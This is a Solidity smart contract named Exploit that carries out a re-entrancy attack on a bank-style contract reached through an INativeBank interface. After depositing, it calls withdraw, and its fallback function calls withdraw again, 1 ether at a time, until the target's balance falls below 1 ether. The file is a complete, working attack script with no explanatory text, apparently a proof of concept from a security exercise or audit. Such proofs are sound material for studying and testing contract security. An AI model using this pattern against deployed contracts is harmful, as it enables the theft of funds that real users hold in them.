// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface INativeBank {
    function withdraw(uint256 amount) external;
}

contract Exploit {
    INativeBank nativeBank;

    constructor(address _nativeBank) {
        nativeBank = INativeBank(_nativeBank);
    }

    fallback() external payable {
        // Re-entrancy attack
        // Ignore missing receive function error
        if (address(nativeBank).balance >= 1 * 10 ** 18) {
            nativeBank.withdraw(1 * 10 ** 18);
        }
    }

    function exploit() external payable {
        (bool success, ) = address(nativeBank).call{value: msg.value}("");
        require(success, "failed to staking");
        nativeBank.withdraw(msg.value);
    }
}
